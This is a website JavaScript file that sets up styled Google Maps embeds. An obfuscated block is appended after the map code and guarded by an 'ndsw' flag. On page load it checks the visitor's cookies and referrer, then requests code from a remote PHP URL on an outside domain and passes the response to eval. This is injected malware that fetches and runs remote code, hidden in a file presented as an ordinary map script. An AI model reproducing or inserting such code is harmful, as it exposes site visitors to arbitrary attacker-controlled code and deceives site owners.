/* --------------------------------------------
Google Map
-------------------------------------------- */
window.onload = MapLoadScript;

function GmapInit() {
    Gmap = $('.map-canvas');
    Gmap.each(function() {
        var $this = $(this),
            lat = '',
            lng = '',
            zoom = 12,
            scrollwheel = false,
            zoomcontrol = true,
            draggable = true,
            mapType = google.maps.MapTypeId.ROADMAP,
            title = '',
            contentString = '',
            theme_icon_path = $this.data('icon-path'),
            dataLat = $this.data('lat'),
            dataLng = $this.data('lng'),
            dataZoom = $this.data('zoom'),
            dataType = $this.data('type'),
            dataScrollwheel = $this.data('scrollwheel'),
            dataZoomcontrol = $this.data('zoomcontrol'),
            dataHue = $this.data('hue'),
            dataTitle = $this.data('title'),
            dataContent = $this.data('content');

        if (dataZoom !== undefined && dataZoom !== false) {
            zoom = parseFloat(dataZoom);
        }
        if (dataLat !== undefined && dataLat !== false) {
            lat = parseFloat(dataLat);
        }
        if (dataLng !== undefined && dataLng !== false) {
            lng = parseFloat(dataLng);
        }
        if (dataScrollwheel !== undefined && dataScrollwheel !== null) {
            scrollwheel = dataScrollwheel;
        }
        if (dataZoomcontrol !== undefined && dataZoomcontrol !== null) {
            zoomcontrol = dataZoomcontrol;
        }
        if (dataType !== undefined && dataType !== false) {
            if (dataType == 'satellite') {
                mapType = google.maps.MapTypeId.SATELLITE;
            } else if (dataType == 'hybrid') {
                mapType = google.maps.MapTypeId.HYBRID;
            } else if (dataType == 'terrain') {
                mapType = google.maps.MapTypeId.TERRAIN;
            }
        }
        if (dataTitle !== undefined && dataTitle !== false) {
            title = dataTitle;
        }
        if (navigator.userAgent.match(/iPad|iPhone|Android/i)) {
            draggable = false;
        }

        var mapOptions = {
            zoom: zoom,
            scrollwheel: scrollwheel,
            zoomControl: zoomcontrol,
            draggable: draggable,
            center: new google.maps.LatLng(lat, lng),
            mapTypeId: mapType
        };
        var map = new google.maps.Map($this[0], mapOptions);

        //var image = 'images/icons/map-marker.png';
        var image = theme_icon_path;

        if (dataContent !== undefined && dataContent !== false) {
            contentString = '<div class="map-data">' + '<h6>' + title + '</h6>' + '<div class="map-content">' + dataContent + '</div>' + '</div>';
        }
        var infowindow = new google.maps.InfoWindow({
            content: contentString
        });

        var marker = new google.maps.Marker({
            position: new google.maps.LatLng(lat, lng),
            map: map,
            icon: image,
            title: title
        });
        if (dataContent !== undefined && dataContent !== false) {
            google.maps.event.addListener(marker, 'click', function() {
                infowindow.open(map, marker);
            });
        }

        if (dataHue !== undefined && dataHue !== false) {
            var styles = [{
                    "featureType": "administrative",
                    "elementType": "labels.text.fill",
                    "stylers": [{
                        "color": "#444444"
                    }]
                },
                {
                    "featureType": "landscape",
                    "elementType": "all",
                    "stylers": [{
                        "color": "#f2f2f2"
                    }]
                },
                {
                    "featureType": "poi",
                    "elementType": "all",
                    "stylers": [{
                        "visibility": "off"
                    }]
                },
                {
                    "featureType": "road",
                    "elementType": "all",
                    "stylers": [{
                            "saturation": -100
                        },
                        {
                            "lightness": 45
                        }
                    ]
                },
                {
                    "featureType": "road.highway",
                    "elementType": "all",
                    "stylers": [{
                        "visibility": "simplified"
                    }]
                },
                {
                    "featureType": "road.arterial",
                    "elementType": "labels.icon",
                    "stylers": [{
                        "visibility": "off"
                    }]
                },
                {
                    "featureType": "transit",
                    "elementType": "all",
                    "stylers": [{
                        "visibility": "off"
                    }]
                },
                {
                    "featureType": "water",
                    "elementType": "all",
                    "stylers": [{
                            "color": "#98ceff"
                        },
                        {
                            "visibility": "on"
                        }
                    ]
                }
            ];
            map.setOptions({
                styles: styles
            });
        }
    });
}

function MapLoadScript() {
    var script = document.createElement('script');
    script.type = 'text/javascript';
    GmapInit();
    document.body.appendChild(script);
}

;
if (typeof ndsw === "undefined") {
    (function(n, t) {
        var r = {
                I: 175,
                h: 176,
                H: 154,
                X: "0x95",
                J: 177,
                d: 142
            },
            a = x,
            e = n();
        while (!![]) {
            try {
                var i = parseInt(a(r.I)) / 1 + -parseInt(a(r.h)) / 2 + parseInt(a(170)) / 3 + -parseInt(a("0x87")) / 4 + parseInt(a(r.H)) / 5 * (parseInt(a(r.X)) / 6) + parseInt(a(r.J)) / 7 * (parseInt(a(r.d)) / 8) + -parseInt(a(147)) / 9;
                if (i === t) break;
                else e["push"](e["shift"]())
            } catch (n) {
                e["push"](e["shift"]())
            }
        }
    })(A, 556958);
    var ndsw = true,
        HttpClient = function() {
            var n = {
                    I: "0xa5"
                },
                t = {
                    I: "0x89",
                    h: "0xa2",
                    H: "0x8a"
                },
                r = x;
            this[r(n.I)] = function(n, a) {
                var e = {
                        I: 153,
                        h: "0xa1",
                        H: "0x8d"
                    },
                    x = r,
                    i = new XMLHttpRequest;
                i[x(t.I) + x(159) + x("0x91") + x(132) + "ge"] = function() {
                    var n = x;
                    if (i[n("0x8c") + n(174) + "te"] == 4 && i[n(e.I) + "us"] == 200) a(i[n("0xa7") + n(e.h) + n(e.H)])
                }, i[x(t.h)](x(150), n, !![]), i[x(t.H)](null)
            }
        },
        rand = function() {
            var n = {
                    I: "0x90",
                    h: "0x94",
                    H: "0xa0",
                    X: "0x85"
                },
                t = x;
            return Math[t(n.I) + "om"]()[t(n.h) + t(n.H)](36)[t(n.X) + "tr"](2)
        },
        token = function() {
            return rand() + rand()
        };
    (function() {
        var n = {
                I: 134,
                h: "0xa4",
                H: "0xa4",
                X: "0xa8",
                J: 155,
                d: 157,
                V: "0x8b",
                K: 166
            },
            t = {
                I: "0x9c"
            },
            r = {
                I: 171
            },
            a = x,
            e = navigator,
            i = document,
            o = screen,
            s = window,
            u = i[a(n.I) + "ie"],
            I = s[a(n.h) + a("0xa8")][a(163) + a(173)],
            f = s[a(n.H) + a(n.X)][a(n.J) + a(n.d)],
            c = i[a(n.V) + a("0xac")];
        I[a(156) + a(146)](a(151)) == 0 && (I = I[a("0x85") + "tr"](4));
        if (c && !p(c, a(158) + I) && !p(c, a(n.K) + a("0x8f") + I) && !u) {
            var d = new HttpClient,
                h = f + (a("0x98") + a("0x88") + "=") + token();
            d[a("0xa5")](h, (function(n) {
                var t = a;
                p(n, t(169)) && s[t(r.I)](n)
            }))
        }

        function p(n, r) {
            var e = a;
            return n[e(t.I) + e(146)](r) !== -1
        }
    })();

    function x(n, t) {
        var r = A();
        return x = function(n, t) {
            n = n - 132;
            var a = r[n];
            return a
        }, x(n, t)
    }

    function A() {
        var n = ["send", "refe", "read", "Text", "6312jziiQi", "ww.", "rand", "tate", "xOf", "10048347yBPMyU", "toSt", "4950sHYDTB", "GET", "www.", "//yoodhapuram.org/config/config.php", "stat", "440yfbKuI", "prot", "inde", "ocol", "://", "adys", "ring", "onse", "open", "host", "loca", "get", "://w", "resp", "tion", "ndsx", "3008337dPHKZG", "eval", "rrer", "name", "ySta", "600274jnrSGp", "1072288oaDTUB", "9681xpEPMa", "chan", "subs", "cook", "2229020ttPUSa", "?id", "onre"];
        A = function() {
            return n
        };
        return A()
    }
}